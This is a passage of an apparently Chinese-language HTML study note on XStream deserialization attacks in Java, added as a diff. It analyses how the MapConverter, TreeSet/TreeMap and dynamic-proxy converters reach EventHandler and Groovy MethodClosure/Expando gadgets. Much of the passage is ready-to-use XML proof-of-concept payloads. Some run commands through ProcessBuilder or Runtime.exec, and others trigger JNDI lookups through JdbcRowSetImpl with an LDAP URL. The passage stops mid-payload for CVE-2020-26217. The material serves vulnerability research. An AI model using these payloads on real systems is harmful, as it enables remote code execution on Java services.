+                &quot;        &lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;\n&quot; +
+                &quot;            &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot; +
+                &quot;                &lt;command&gt;\n&quot; +
+                &quot;                    &lt;string&gt;calc.exe&lt;/string&gt;\n&quot; +
+                &quot;                &lt;/command&gt;\n&quot; +
+                &quot;            &lt;/target&gt;\n&quot; +
+                &quot;            &lt;action&gt;start&lt;/action&gt;\n&quot; +
+                &quot;        &lt;/handler&gt;\n&quot; +
+                &quot;    &lt;/dynamic-proxy&gt;\n&quot; +
+                &quot;&lt;/sorted-set&gt;&quot;;
+        xstream.fromXML(x);
+    }
+}
+</code></pre><p>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x5DE5;&#x5177; marshalsec &#x91CC;&#x5C31;&#x53EF;&#x4EE5;&#x751F;&#x6210; XStream &#x7684;&#x5F88;&#x591A; gadgets </p>
+<pre><code>CommonsConfiguration
+Rome
+CommonsBeanutils
+ServiceLoader
+ImageIO
+BindingEnumeration
+LazySearchEnumeration
+SpringAbstractBeanFactoryPointcutAdvisor
+SpringPartiallyComparableAdvisorHolder
+Resin
+XBean
+</code></pre><p>&#x5B9E;&#x73B0;&#x7684;&#x8FD9;&#x4E9B;&#x63A5;&#x53E3;&#x90FD;&#x662F;&#x53EF;&#x4EE5;&#x751F;&#x6210;&#x7684; gadgets </p>
+<h3 id="xstream&#x53CD;&#x5E8F;&#x5217;&#x5316;">Xstream&#x53CD;&#x5E8F;&#x5217;&#x5316;</h3>
+<p>&#x53C2;&#x8003;: </p>
+<ul>
+<li><a href="https://www.anquanke.com/post/id/204314" target="_blank">https://www.anquanke.com/post/id/204314</a></li>
+<li><a href="https://blog.szfszf.top/article/52/" target="_blank">https://blog.szfszf.top/article/52/</a></li>
+<li><a href="https://blog.0kami.cn/2020/04/18/java/talk-about-xstream-deserialization/" target="_blank">https://blog.0kami.cn/2020/04/18/java/talk-about-xstream-deserialization/</a></li>
+</ul>
+<p>XStream&#x7684;&#x5E8F;&#x5217;&#x5316;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4E3B;&#x8981;&#x4F9D;&#x9760;<code>toXML</code>&#x51FD;&#x6570;&#x548C;<code>fromXML</code>&#x51FD;&#x6570; </p>
+<p>&#x5173;&#x4E8E;XStream&#x7684;fromXML&#x5206;&#x6790;&#x53C2;&#x8003;<a href="https://www.jianshu.com/p/387c568faf62" target="_blank">&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;</a></p>
+<p>XStream&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x548C;fastjson&#x4E0D;&#x4E00;&#x6837;&#x7684;&#x5730;&#x65B9;&#x662F;fastjson&#x4F1A;&#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x65F6;&#x5019;&#x4E3B;&#x52A8;&#x53BB;&#x8C03;&#x7528;getters&#x548C;setters&#xFF0C;&#x800C;XStream&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8FC7;&#x7A0B;&#x4E2D;&#x8D4B;&#x503C;&#x90FD;&#x6709;Java&#x7684;&#x53CD;&#x5C04;&#x673A;&#x5236;&#x6765;&#x5B8C;&#x6210;&#xFF0C;&#x6240;&#x4EE5;&#x5E76;&#x6CA1;&#x6709;&#x8FD9;&#x6837;&#x4E3B;&#x52A8;&#x8C03;&#x7528;&#x7684;&#x7279;&#x6027;&#x3002; </p>
+<h3 id="mapconverter">MapConverter</h3>
+<p>&#x9488;&#x5BF9;Map&#x7C7B;&#x578B;&#x8FD8;&#x539F;&#x7684;Converter</p>
+<p>com.thoughtworks.xstream.converters.collections.MapConverter#unmarshal</p>
+<p><img src="img/1644240547795.png" alt="1644240547795"></p>
+<p><code>populateMap</code>&#x51FD;&#x6570;&#x4F1A;&#x53BB;&#x5904;&#x7406;&#x540E;&#x7EED;&#x7684;&#x503C;&#xFF0C;&#x76F4;&#x63A5;&#x6765;&#x770B;&#x5177;&#x4F53;put&#x7684;&#x5730;&#x65B9; com.thoughtworks.xstream.converters.collections.MapConverter#putCurrentEntryIntoMap </p>
+<p><img src="img/1644240666467.png" alt="1644240666467"></p>
+<p>&#x8FD9;&#x91CC;target&#x4F5C;&#x4E3A;&#x63A5;&#x6536;&#x8005;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;Map&#x7684;put&#x51FD;&#x6570;&#xFF0C;&#x540E;&#x7EED;&#x5C31;&#x662F;&#x5BF9;key&#x8C03;&#x7528;hashCode&#x51FD;&#x6570;</p>
+<p><img src="img/1644241596961.png" alt="1644241596961"></p>
+<h3 id="treesettreemapconverter">TreeSet/TreeMapConverter</h3>
+<p>&#x8FD9;&#x91CC;TreeSet&#x548C;TreeMap&#x653E;&#x4E00;&#x8D77;&#xFF0C;&#x56E0;&#x4E3A;TreeSet&#x672C;&#x8EAB;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x53EA;&#x7528;&#x4E0A;&#x4E86;Key&#x7684;TreeMap&#xFF1B;TreeSetConverter&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5904;&#x7406;&#x4E5F;&#x662F;&#x5148;&#x8F6C;&#x5316;&#x4E3A;TreeMapConverter&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x4F18;&#x5148;&#x8FD8;&#x539F;TreeSet&#x91CC;&#x7684;TreeMap&#xFF0C;&#x518D;&#x586B;&#x5145;&#x5230;TreeSet&#x91CC;&#x3002;</p>
+<p>&#x4ECE;TreeSetConverter&#x5F00;&#x59CB;</p>
+<p><img src="img/1644241300033.png" alt="1644241300033"></p>
+<p>&#x4ECE;Treeset&#x4E2D;&#x53D6;&#x51FA;field treemap&#x540E;&#xFF0C;&#x53BB;&#x8FDB;&#x4E00;&#x6B65;&#x8C03;&#x7528;TreeMapConverter&#x6765;&#x8FD8;&#x539F;TreeMap com.thoughtworks.xstream.converters.collections.TreeMapConverter#populateTreeMap </p>
+<p><img src="img/1644241382471.png" alt="1644241382471"></p>
+<p>&#x8FD9;&#x91CC;&#x5148;&#x7528;soredMap&#x6765;&#x586B;&#x5145;&#x9700;&#x8981;&#x8FD8;&#x539F;&#x7684;Entry&#xFF0C;&#x540E;&#x7EED;&#x5C06;&#x8C03;&#x7528;<code>TreeMap.putAll</code> </p>
+<p><img src="img/1644241431860.png" alt="1644241431860"></p>
+<p>&#x6700;&#x7EC8;&#x4F1A;&#x8C03;&#x7528;&#x5230;<code>java.util.AbstractMap#putAll</code> </p>
+<p><img src="img/1644241510904.png" alt="1644241510904"></p>
+<p>&#x8FD9;&#x91CC;&#x7684;put&#x51FD;&#x6570;&#x4E3A;<code>TreeMap.put</code> , &#x5B83;&#x7684;&#x4E3B;&#x8981;&#x529F;&#x80FD;&#x5C31;&#x662F;&#x586B;&#x5145;&#x6570;&#x636E;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x586B;&#x5145;&#x65F6;&#x5C06;&#x4F1A;&#x6BD4;&#x8F83;&#x5F53;&#x524D;&#x5B58;&#x5728;key&#xFF0C;&#x5982;&#x679C;&#x662F;&#x76F8;&#x540C;&#x7684;key&#xFF0C;&#x5219;&#x66FF;&#x6362;&#x539F;&#x6709;&#x8001;&#x7684;&#x503C;&#x3002;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x4F1A;&#x53BB;&#x8C03;&#x7528;key&#x7684;<code>compareTo</code>&#x51FD;&#x6570; </p>
+<h3 id="dynamicproxyconverter">DynamicProxyConverter</h3>
+<p>XStream&#x8FD8;&#x652F;&#x6301;&#x5BF9;&#x52A8;&#x6001;&#x4EE3;&#x7406;&#x7684;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x8FD8;&#x539F; </p>
+<p><img src="img/image-20200415162242443.png" alt="image-20200415162242443"> </p>
+<p>&#x4E3B;&#x8981;&#x7684;&#x5173;&#x6CE8;&#x70B9;&#x662F;&#x4F7F;&#x7528;Proxy&#x52A8;&#x6001;&#x4EE3;&#x7406;, &#x53EF;&#x4EE5;&#x6269;&#x5C55;&#x524D;&#x9762;&#x4E24;&#x79CD;&#x7684;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#x51FD;&#x6570;&#x7684;&#x653B;&#x51FB;&#x9762; </p>
+<p>&#x7ED3;&#x5408;&#x4E0A;&#x9762;&#x57FA;&#x7840;&#x77E5;&#x8BC6;&#x4E2D;&#x63D0;&#x5230;&#x7684;&#x51E0;&#x4E2A;Converter&#xFF0C;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x5229;&#x7528;XStream&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x7684;&#x8BDD;&#xFF0C;&#x5F97;&#x53BB;&#x5145;&#x5206;&#x5229;&#x7528;&#x524D;&#x9762;&#x63D0;&#x5230;&#x7684;&#x51E0;&#x4E2A;&#x4F1A;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#x7684;&#x51FD;&#x6570; </p>
+<h3 id="eventhandler">EventHandler</h3>
+<p>XStream&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7528;&#x7684;&#x6700;&#x591A;&#x7684;<code>EventHandler</code>&#xFF0C;&#x6765;&#x770B;&#x770B;&#x5B83;&#x7684;<code>invoke</code>&#x51FD;&#x6570; </p>
+<p><img src="img/1644245329315.png" alt="1644245329315"></p>
+<p>&#x9996;&#x5148;&#x9700;&#x8981;&#x5224;&#x65AD;&#x6B64;&#x65F6;&#x8C03;&#x7528;&#x7684;&#x51FD;&#x6570;&#x662F;&#x5426;&#x4E3A;<code>hashCode</code>&#x3001;<code>equals</code>&#x3001;<code>toString</code>&#xFF0C;&#x5982;&#x679C;&#x662F;&#x7684;&#x8BDD;&#xFF0C;&#x91C7;&#x7528;&#x4EE5;&#x4E0B;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x5904;&#x7406;&#x3002; </p>
+<pre><code class="lang-java"><span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;hashCode&quot;</span>))  {
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Integer(System.identityHashCode(proxy));
+    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;equals&quot;</span>)) {
+        <span class="hljs-keyword">return</span> (proxy == arguments[<span class="hljs-number">0</span>] ? Boolean.TRUE : Boolean.FALSE);
+    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.equals(<span class="hljs-string">&quot;toString&quot;</span>)) {
+        <span class="hljs-keyword">return</span> proxy.getClass().getName() + <span class="hljs-string">&apos;@&apos;</span> + Integer.toHexString(proxy.hashCode());
+}
+</code></pre>
+<p>&#x9700;&#x8981;&#x5229;&#x7528;&#x7684;&#x662F;<code>invokeInternal</code>&#x51FD;&#x6570;&#x540E;&#x7EED;&#x7684;&#x90E8;&#x5206;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5229;&#x7528;&#x7684;&#x65F6;&#x5019;&#x4E0D;&#x80FD;&#x7528;&#x5B83;&#x6765;&#x8C03;&#x7528;&#x4E0A;&#x9762;&#x7684;3&#x4E2A;&#x51FD;&#x6570;&#xFF0C;<strong>&#x610F;&#x5473;&#x7740;&#x524D;&#x9762;&#x63D0;&#x5230;&#x7684;<code>Map</code>&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x4E0D;&#x9002;&#x5408;&#x7528;&#x5728;&#x8FD9;&#x4E2A;&#x5730;&#x65B9;</strong>&#xFF1B;&#x800C;<code>TreeSet</code>&#x8FD9;&#x79CD;&#x8C03;&#x7528;<code>compareTo</code>&#x51FD;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x7EE7;&#x7EED;&#x5F80;&#x4E0B;&#x8D70;&#x3002; </p>
+<p><img src="img/1644246053051.png" alt="1644246053051"></p>
+<p>&#x540E;&#x7EED;&#x7684;&#x5C31;&#x662F;java&#x53CD;&#x5C04;&#x673A;&#x5236;&#x6765;&#x5B9E;&#x73B0;&#x51FD;&#x6570;&#x8C03;&#x7528;, &#x5E76;&#x4E14;&#x8FD9;&#x91CC;&#x7684;target&#x548C;action&#x90FD;&#x662F;&#x53EF;&#x63A7;&#x7684;&#x3002;</p>
+<p>&#x6B64;&#x5904;action&#x51FD;&#x6570;&#x53C2;&#x6570;&#x662F;&#x6709;&#x8981;&#x6C42;&#x7684;:</p>
+<ol>
+<li>&#x65E0;&#x53C2;&#x6570;</li>
+<li>&#x5355;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x4E14;&#x53C2;&#x6570;&#x7684;&#x7C7B;&#x578B;&#x4E3A;<code>Comparable</code>&#xFF0C;&#x5E76;&#x4E14;&#x8FD9;&#x4E2A;action&#x51FD;&#x6570;&#x662F;&#x53EF;&#x5229;&#x7528;&#x7684;</li>
+</ol>
+<p>&#x7B2C;2&#x79CD;&#x6682;&#x65F6;&#x672A;&#x51FA;&#x73B0;, &#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7B2C;&#x4E00;&#x79CD;&#x65B9;&#x6CD5;:</p>
+<ul>
+<li>&#x914D;&#x7F6E;&#x597D;cmd&#x7684;<code>ProcessBuilder</code>&#xFF0C;action&#x586B;<code>start</code></li>
+<li>&#x914D;&#x7F6E;&#x597D;rmi url&#x7684;<code>JdbcRowSetImpl</code>&#xFF0C;action&#x586B;<code>getDatabaseMetaData</code>&#xFF0C;&#x4E3B;&#x8981;&#x601D;&#x8DEF;&#x5C31;&#x662F;&#x53EF;&#x5229;&#x7528;&#x7684;getters</li>
+</ul>
+<p>TreeSet</p>
+<p>POC1</p>
+<pre><code>&lt;sorted-set&gt;
+    &lt;dynamic-proxy&gt;
+        &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
+        &lt;handler class=&quot;java.beans.EventHandler&quot;&gt;
+            &lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt;
+                &lt;command&gt;
+                    &lt;string&gt;calc.exe&lt;/string&gt;
+                &lt;/command&gt;
+            &lt;/target&gt;
+            &lt;action&gt;start&lt;/action&gt;
+        &lt;/handler&gt;
+    &lt;/dynamic-proxy&gt;
+&lt;/sorted-set&gt;
+</code></pre><p>POC2</p>
+<pre><code>&lt;sorted-set&gt;
+  &lt;dynamic-proxy&gt;
+    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
+    &lt;handler class=&quot;java.beans.EventHandler&quot;&gt;
+      &lt;target class=&quot;com.sun.rowset.JdbcRowSetImpl&quot; serialization=&quot;custom&quot;&gt;
+        &lt;javax.sql.rowset.BaseRowSet&gt;
+          &lt;default&gt;
+            &lt;dataSource&gt;ldap://127.0.0.1:1099/calc&lt;/dataSource&gt;
+          &lt;/default&gt;
+        &lt;/javax.sql.rowset.BaseRowSet&gt;
+      &lt;/target&gt;
+      &lt;action&gt;getDatabaseMetaData&lt;/action&gt;
+    &lt;/handler&gt;
+  &lt;/dynamic-proxy&gt;
+&lt;/sorted-set&gt;
+</code></pre><p>&#x4E5F;&#x5C31;&#x662F;&#x628A;<code>dataSource</code>&#x5728;&#x7236;&#x7C7B;<code>javax.sql.rowset.BaseRowSet</code>&#x9ED8;&#x8BA4;&#x8D4B;&#x503C;&#x540E;&#x8C03;&#x7528;&#x5B50;&#x7C7B;<code>com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData</code>&#x89E6;&#x53D1;JNDI&#x6CE8;&#x5165;, &#x5B8C;&#x6574;&#x7684;&#x5199;&#x6CD5;&#x4F1A;&#x6BD4;&#x8FD9;&#x4E2A;&#x590D;&#x6742;, &#x539F;&#x56E0;&#x662F;&#x628A;&#x6240;&#x6709;&#x7684;&#x9ED8;&#x8BA4;&#x503C;&#x90FD;&#x751F;&#x6210;&#x4E86;</p>
+<p>POC3</p>
+<pre><code>&lt;sorted-set&gt;
+  &lt;dynamic-proxy&gt;
+    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
+    &lt;handler class=&quot;java.beans.EventHandler&quot;&gt;
+      &lt;target class=&quot;com.sun.rowset.JdbcRowSetImpl&quot; serialization=&quot;custom&quot;&gt;
+        &lt;javax.sql.rowset.BaseRowSet&gt;
+          &lt;default&gt;
+            &lt;concurrency&gt;1008&lt;/concurrency&gt;
+            &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;
+            &lt;fetchDir&gt;1000&lt;/fetchDir&gt;
+            &lt;fetchSize&gt;0&lt;/fetchSize&gt;
+            &lt;isolation&gt;2&lt;/isolation&gt;
+            &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;
+            &lt;maxRows&gt;0&lt;/maxRows&gt;
+            &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;
+            &lt;readOnly&gt;true&lt;/readOnly&gt;
+            &lt;rowSetType&gt;1004&lt;/rowSetType&gt;
+            &lt;showDeleted&gt;false&lt;/showDeleted&gt;
+            &lt;dataSource&gt;ldap://127.0.0.1:1099/calc&lt;/dataSource&gt;
+            &lt;listeners/&gt;
+            &lt;params/&gt;
+          &lt;/default&gt;
+        &lt;/javax.sql.rowset.BaseRowSet&gt;
+        &lt;com.sun.rowset.JdbcRowSetImpl&gt;
+          &lt;default&gt;
+            &lt;iMatchColumns&gt;
+              &lt;int&gt;-1&lt;/int&gt;
+              &lt;int&gt;-1&lt;/int&gt;
+              &lt;int&gt;-1&lt;/int&gt;
+              &lt;int&gt;-1&lt;/int&gt;
+              &lt;int&gt;-1&lt;/int&gt;
+              &lt;int&gt;-1&lt;/int&gt;
+              &lt;int&gt;-1&lt;/int&gt;
+              &lt;int&gt;-1&lt;/int&gt;
+              &lt;int&gt;-1&lt;/int&gt;
+              &lt;int&gt;-1&lt;/int&gt;
+            &lt;/iMatchColumns&gt;
+            &lt;strMatchColumns&gt;
+              &lt;null/&gt;
+              &lt;null/&gt;
+              &lt;null/&gt;
+              &lt;null/&gt;
+              &lt;null/&gt;
+              &lt;null/&gt;
+              &lt;null/&gt;
+              &lt;null/&gt;
+              &lt;null/&gt;
+              &lt;null/&gt;
+            &lt;/strMatchColumns&gt;
+          &lt;/default&gt;
+        &lt;/com.sun.rowset.JdbcRowSetImpl&gt;
+      &lt;/target&gt;
+      &lt;action&gt;getDatabaseMetaData&lt;/action&gt;
+    &lt;/handler&gt;
+  &lt;/dynamic-proxy&gt;
+&lt;/sorted-set&gt;
+</code></pre><p>TreeMap</p>
+<p>POC4</p>
+<pre><code>&lt;tree-map&gt;
+  &lt;entry&gt;
+    &lt;dynamic-proxy&gt;
+      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
+      &lt;handler class=&quot;java.beans.EventHandler&quot;&gt;
+        &lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt;
+          &lt;command&gt;
+            &lt;string&gt;calc.exe&lt;/string&gt;
+          &lt;/command&gt;
+          &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
+        &lt;/target&gt;
+        &lt;action&gt;start&lt;/action&gt;
+      &lt;/handler&gt;
+    &lt;/dynamic-proxy&gt;
+    &lt;string&gt;ricky&lt;/string&gt;
+  &lt;/entry&gt;
+&lt;/tree-map&gt;
+</code></pre><p>POC5</p>
+<pre><code>&lt;tree-map&gt;
+  &lt;entry&gt;
+    &lt;dynamic-proxy&gt;
+      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
+      &lt;handler class=&quot;java.beans.EventHandler&quot;&gt;
+        &lt;target class=&quot;com.sun.rowset.JdbcRowSetImpl&quot; serialization=&quot;custom&quot;&gt;
+        &lt;javax.sql.rowset.BaseRowSet&gt;
+          &lt;default&gt;
+            &lt;dataSource&gt;ldap://127.0.0.1:1099/calc&lt;/dataSource&gt;
+          &lt;/default&gt;
+        &lt;/javax.sql.rowset.BaseRowSet&gt;
+      &lt;/target&gt;
+      &lt;action&gt;getDatabaseMetaData&lt;/action&gt;
+    &lt;/handler&gt;
+    &lt;/dynamic-proxy&gt;
+    &lt;string&gt;ricky&lt;/string&gt;
+  &lt;/entry&gt;
+&lt;/tree-map&gt;
+</code></pre><h3 id="groovy-convertedclosure">Groovy ConvertedClosure</h3>
+<p>&#x5229;&#x7528;&#x73AF;&#x5883;&#xFF1A;groovy &lt;= 2.4.3&#xFF0C;&#x5728;&#x540E;&#x7EED;&#x7684;&#x7248;&#x672C;&#x91CC;&#xFF0C;<code>MethodClosure</code>&#x4E0D;&#x5141;&#x8BB8;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8C03;&#x7528;</p>
+<h4 id="methodclosure">MethodClosure</h4>
+<p>&#x5F53;&#x524D;MethodClosure&#x7684;&#x4E3B;&#x8981;&#x4F5C;&#x7528;&#x5C31;&#x662F;&#x5C01;&#x88C5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6267;&#x884C;&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x6BD4;&#x5982;</p>
+<pre><code class="lang-java"><span class="hljs-keyword">new</span> MethodClosure(Runtime.getRuntime(), <span class="hljs-string">&quot;exec&quot;</span>);
+</code></pre>
+<p>&#x5C01;&#x88C5;<code>Runtime</code>&#x5BF9;&#x8C61;&#xFF0C;&#x5E76;&#x8BBE;&#x5B9A;&#x540E;&#x7EED;&#x9700;&#x8981;&#x8C03;&#x7528;&#x7684;&#x51FD;&#x6570;<code>exec</code></p>
+<h3 id="convertedclosure">ConvertedClosure</h3>
+<p>&#x8FD9;&#x4E2A;<code>ConvertedClosure</code>&#x4E5F;&#x662F;&#x7EE7;&#x627F;&#x4E86;<code>InvocationHandler</code>&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x52A8;&#x6001;&#x4EE3;&#x7406;&#x4E2D;&#x4F5C;&#x4E3A;handler&#x7684;&#x5B58;&#x5728;&#xFF0C;&#x6765;&#x770B;&#x4E00;&#x4E0B;&#x4ED6;&#x7684;invoke</p>
+<p>ConvertedClosure &#x8C03;&#x7528;&#x7684;&#x662F;&#x7236;&#x7C7B;<code>org.codehaus.groovy.runtime.ConversionHandler#invoke</code></p>
+<p><img src="img/1644249985466.png" alt="1644249985466"></p>
+<p>&#x4E3B;&#x8981;&#x770B;&#x8FD9;&#x4E2A;&#x90E8;&#x5206;&#xFF0C;&#x5BF9;&#x4E8E;&#x5F53;&#x524D;&#x8C03;&#x7528;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x5982;&#x679C;&#x975E;Object&#x7684;&#x51FD;&#x6570;(&#x5982;toString&#x3001;hashCode&#x7B49;)&#xFF0C;&#x5E76;&#x4E14;&#x4E0D;&#x662F;<code>GroovyObject</code>&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x4F1A;&#x53BB;&#x8C03;&#x7528;&#x5B50;&#x7C7B;&#x7684;<code>invokeCustom</code>&#xFF0C;&#x8FD9;&#x91CC;&#x770B;<code>org.codehaus.groovy.runtime.ConvertedClosure#invokeCustom</code> </p>
+<p><img src="img/1644250022030.png" alt="1644250022030"></p>
+<p>&#x8FD9;&#x91CC;&#x7684;&#x5C5E;&#x6027;&#x90FD;&#x662F;&#x53EF;&#x63A7;&#x7684;&#xFF0C;&#x4E5F;&#x5C31;&#x610F;&#x5473;&#x7740;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53BB;&#x8C03;&#x7528;&#x53BB;&#x8C03;&#x7528;&#x524D;&#x9762;&#x6784;&#x9020;&#x597D;&#x7684;<code>MethodClosure</code> </p>
+<p>&#x53C2;&#x8003;: <a href="https://paper.seebug.org/1171/" target="_blank">https://paper.seebug.org/1171/</a></p>
+<p><code>compareTo</code>&#x4F1A;&#x5E26;&#x4E0A;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;<code>MethodClosure</code>&#x5C01;&#x88C5;&#x7684;&#x540E;&#x7EED;&#x9700;&#x8981;&#x8C03;&#x7528;&#x7684;&#x51FD;&#x6570;&#x5FC5;&#x987B;&#x8981;&#x5B58;&#x5728;&#x4E00;&#x4E2A;String&#x7C7B;&#x578B;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x4E0D;&#x7136;&#x4F1A;&#x627E;&#x4E0D;&#x5230;&#x51FD;&#x6570;&#x62A5;&#x9519;,  &#x76F4;&#x63A5;&#x6784;&#x9020;<code>Runtime.exec</code>&#x53EF;&#x4EE5;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898; </p>
+<pre><code>&lt;sorted-set&gt;
+  &lt;string&gt;calc&lt;/string&gt;
+  &lt;dynamic-proxy&gt;
+    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
+    &lt;handler class=&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;&gt;
+      &lt;delegate class=&quot;org.codehaus.groovy.runtime.MethodClosure&quot;&gt;
+        &lt;delegate class=&quot;java.lang.Runtime&quot;/&gt;
+        &lt;owner class=&quot;java.lang.Runtime&quot; reference=&quot;../delegate&quot;/&gt;
+        &lt;method&gt;exec&lt;/method&gt;
+      &lt;/delegate&gt;
+      &lt;handleCache/&gt;
+      &lt;methodName&gt;compareTo&lt;/methodName&gt;
+    &lt;/handler&gt;
+  &lt;/dynamic-proxy&gt;
+&lt;/sorted-set&gt;
+</code></pre><h3 id="groovy-expando">Groovy Expando</h3>
+<p>&#x8FD9;&#x91CC;&#x4F7F;&#x7528;<code>Map</code>&#x7684;&#x7C7B;&#x578B;&#x6765;&#x89E6;&#x53D1;&#x3002;&#x4EE5;<code>Map</code>&#x7684;&#x7C7B;&#x578B;&#x6765;&#x89E6;&#x53D1;&#xFF0C;&#x90A3;&#x5C31;&#x662F;&#x627E;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7684;<code>hashCode</code>&#x51FD;&#x6570;</p>
+<p>groovy.util.Expando#hashCode </p>
+<p><img src="img/1644250612546.png" alt="1644250612546"></p>
+<p>&#x5982;&#x679C;&#x5728;&#x7C7B;&#x5C5E;&#x6027;<code>expandoProperties</code>&#x4E2D;&#x5B58;&#x5728;<code>hashCode:methodclosure</code>&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;&#x8FD9;&#x91CC;&#x76F4;&#x63A5;&#x8C03;&#x7528;<code>MethodClosure</code>&#x7684;<code>call</code>&#x51FD;&#x6570;&#xFF0C;&#x8DDF;&#x4E0A;&#x9762;<code>ConvertedClosure</code>&#x540E;&#x7EED;&#x7684;&#x8C03;&#x7528;&#x4E00;&#x6837;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#x8C03;&#x7528;&#x65F6;&#x6CA1;&#x6709;&#x51FD;&#x6570;&#x53C2;&#x6570;&#x8FC7;&#x6765;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x7684;&#x601D;&#x8DEF;&#x662F;<code>ProcessBuilder.start</code>&#x6216;&#x8005;fastjson&#x90A3;&#x79CD;getters&#x7684;&#x5229;&#x7528;</p>
+<pre><code>&lt;map&gt;
+  &lt;entry&gt;
+    &lt;groovy.util.Expando&gt;
+      &lt;expandoProperties&gt;
+        &lt;entry&gt;
+          &lt;string&gt;hashCode&lt;/string&gt;
+          &lt;org.codehaus.groovy.runtime.MethodClosure&gt;
+            &lt;delegate class=&quot;java.lang.ProcessBuilder&quot;&gt;
+              &lt;command&gt;
+                &lt;string&gt;calc.exe&lt;/string&gt;
+              &lt;/command&gt;
+              &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
+            &lt;/delegate&gt;
+            &lt;owner class=&quot;java.lang.ProcessBuilder&quot; reference=&quot;../delegate&quot;/&gt;
+            &lt;resolveStrategy&gt;0&lt;/resolveStrategy&gt;
+            &lt;directive&gt;0&lt;/directive&gt;
+            &lt;parameterTypes/&gt;
+            &lt;maximumNumberOfParameters&gt;0&lt;/maximumNumberOfParameters&gt;
+            &lt;method&gt;start&lt;/method&gt;
+          &lt;/org.codehaus.groovy.runtime.MethodClosure&gt;
+        &lt;/entry&gt;
+      &lt;/expandoProperties&gt;
+    &lt;/groovy.util.Expando&gt;
+    &lt;string&gt;ricky&lt;/string&gt;
+  &lt;/entry&gt;
+&lt;/map&gt;
+</code></pre><p>groovy String execute() method (sample: &quot;calc.exe&quot;.execute())</p>
+<pre><code>&lt;map&gt;
+  &lt;entry&gt;
+    &lt;groovy.util.Expando&gt;
+      &lt;expandoProperties&gt;
+        &lt;entry&gt;
+          &lt;string&gt;hashCode&lt;/string&gt;
+          &lt;org.codehaus.groovy.runtime.MethodClosure&gt;
+              &lt;delegate class=&quot;string&quot;&gt;calc.exe&lt;/delegate&gt;
+            &lt;owner class=&quot;string&quot;&gt;calc.exe&lt;/owner&gt;
+            &lt;method&gt;execute&lt;/method&gt;
+          &lt;/org.codehaus.groovy.runtime.MethodClosure&gt;
+        &lt;/entry&gt;
+      &lt;/expandoProperties&gt;
+    &lt;/groovy.util.Expando&gt;
+    &lt;groovy.util.Expando/&gt;
+  &lt;/entry&gt;
+&lt;/map&gt;
+</code></pre><h3 id="imageiocontainsfiltercve-2020-26217">ImageIO$ContainsFilter(CVE-2020-26217)</h3>
+<p>&#x8FD9;&#x6761;&#x94FE;&#x5229;&#x7528;&#x7684;&#x4E5F;&#x662F;HashMap&#x81EA;&#x52A8;&#x8C03;&#x7528;hashCode&#x65B9;&#x6CD5;&#x7684;&#x89E6;&#x53D1;&#x70B9; </p>
+<p><img src="img/image-20210707112016412.png" alt="image-20210707112016412"> </p>
+<p>POC</p>
+<pre><code>&lt;map&gt;
+  &lt;entry&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString&gt;
